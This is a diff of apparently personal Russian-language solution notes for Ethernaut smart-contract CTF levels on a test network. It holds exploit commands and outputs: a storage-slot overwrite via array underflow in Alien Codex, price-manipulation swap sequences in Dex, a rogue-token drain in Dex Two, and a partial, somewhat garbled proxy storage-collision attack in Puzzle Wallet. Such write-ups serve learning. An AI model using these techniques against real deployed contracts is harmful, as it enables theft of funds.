@@ -333,10 +333,30 @@ object "Contract" {
         }
     }
   }
-  ```
+```
 
 ### 19. Alien Codex (****)
-Предположение №1 - адрес владельца контракта чисто случайно лежит в ячейке с адресом codex[05] - нет(
+>cast storage 0x434894aE876e082EDB94641014E8fc7A2C8eadC5 0 --rpc-url "https://ethereum-sepolia.publicnode.com"
+0x0000000000000000000000010bc04aa6aac163a6b3667636d798fa053d43bd11
+                        0x0bc04aa6aac163a6b3667636d798fa053d43bd11 - owner
+0x000000000000000000000001                                         - bool public contact;                        
+>cast storage 0x434894aE876e082EDB94641014E8fc7A2C8eadC5 1 --rpc-url "https://ethereum-sepolia.publicnode.com"
+0x0000000000000000000000000000000000000000000000000000000000000005 - codex.length
+
+>_ethers.utils.keccak256(_ethers.utils.defaultAbiCoder.encode(["uint256"], [1]))
+'0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6' - first element of dynamic array codex
+
+uint256.max - 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6 + 1 = 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a - index of dynamic array codex -> slot 0
+
+>contract.retract()
+>contract.retract()
+>contract.retract()
+>contract.retract()
+>contract.retract()
+>contract.retract()
+>contract.revise('0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a', '0x000000000000000000000001000003414ba674ebdf64c1e78d76a127d95463eb')
+>await contract.owner()
+'0x000003414bA674eBdf64C1E78d76a127d95463EB'
 
 
 ### 20. Denial (***)
@@ -381,12 +401,94 @@ contract Buyer {
 ```
 
 ### 22. Dex (**)
+Вот она - токеномика))
+>Number(await contract.balanceOf('0x1ebc77Cb6FD737c6d0ef827B7Dfd7bebD89De190', player))
+10
+Для удобства
+>const t1 = '0x1ebc77Cb6FD737c6d0ef827B7Dfd7bebD89De190'
+>const t2 = '0x09102cC7Bf1F1CE5295dF0A4cD47c9031f0dd860'
+>await contract.getSwapPrice(t1, t2, 10)
+10, цена 1:1
 
+>await contract.approve(contract.address, 10000)
+>await contract.swap(t1, t2, 1)
+>await contract.getSwapPrice(t1, t2, 10)
+9 - ага, все правильно, цена меняется. Теперь несколько операций для победы
+>await contract.swap(t1, t2, 9)
+>Number(await contract.balanceOf(t2, player))
+19
+>await contract.swap(t2, t1, 19)
+>Number(await contract.balanceOf(t1, player))
+22
+>await contract.swap(t1, t2, 22)
+>Number(await contract.balanceOf(t2, player))
+27
+>await contract.swap(t2, t1, 27)
+>await contract.swap(t1, t2, 35)
+>await contract.swap(t2, t1, 51)
+>await contract.swap(t1, t2, 95) - error
+>await contract.swap(t1, t2, 5)
+>Number(await contract.balanceOf(t1, player))
+90
+>Number(await contract.balanceOf(t2, player))
+36
+>await contract.swap(t2, t1, 36)
+>Number(await contract.balanceOf(t1, player))
+99
+...
+>Number(await contract.balanceOf(t1, player))
+107
+>await contract.swap(t1, t2, 3)
+>Number(await contract.balanceOf(t2, player))
+110
+>Number(await contract.balanceOf(t1, player))
+104
 
 ### 23. Dex Two (**)
+Отличается от предыдущего отсутствием проверки в swap на принадлежность к токенам `require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");`
+А это значит можно добавить свой токен и слить все через него
+SwappableTokenTwo.deploy()
+SwappableTokenTwo.approve(contract.address, 10000000000)
+SwappableTokenTwo.transfer(contract.address, 100) //и переслать немног токенов в этот контракт
 
+>const t1 = await contract.token1()
+>const t2 = await contract.token2()
+>const t3 = await SwappableTokenTwo.address
+>await contract.approve(contract.address, 10000)
+>Number(await contract.balanceOf(t1, player))
+10 - как и обещали)
+>Number(await contract.balanceOf(t3, contract.address))
+100
+>await contract.swap(t3, t2, 100)
+>await contract.swap(t3, t1, 200)
 
 ### 24. Puzzle Wallet (****)
+Посмотрю, что в этом контракте в storage
+cast storage 0x725595BA16E76ED1F6cC1e1b65A88365cC494824 0 --rpc-url "https://ethereum-sepolia.publicnode.com"
+0x000000000000000000000000725595ba16e76ed1f6cc1e1b65a88365cc494824 - 0 address public pendingAdmin
+0x000000000000000000000000725595ba16e76ed1f6cc1e1b65a88365cc494824 - 1 address public admin
+0x0000000000000000000000000000000000000000000000000000000000000000 - 2-7
+contract PuzzleProxy is UpgradeableProxy {
+    address public pendingAdmin;    //slot 0
+    address public admin;           //slot 1
+    ...
+}
+contract PuzzleWallet {
+    address public owner;           //slot 0
+    uint256 public maxBalance;      //slot 1
+    ...
+}
+Сначала я запрошу администво через pendingAdmin. Это поменяет в PuzzleWallet адрес владельца контракта.
+Открываю remix, PuzzleProxy as address, вызывааю PuzzleProxy.proposeNewAdmin(player)
+Теперь я админ в PuzzleWallet. А это значит могу добавить себя в Whitelist
+>await contract.addToWhitelist(player)
+
+
+нет - , а после вызвав setMaxBalance() указав в аргументе свой адрес переписать в PuzzleProxy адрес admin. 
+
+
+>let dd = _ethers.utils.defaultAbiCoder.encode([ "bytes4", "address" ], [ _ethers.utils.keccak256(_ethers.utils.toUtf8Bytes("setMaxBalance(uint256)")).substr(0,10), player ])
+>await contract.multicall([dd])
 
 
 ### 25. Motorbike (***)
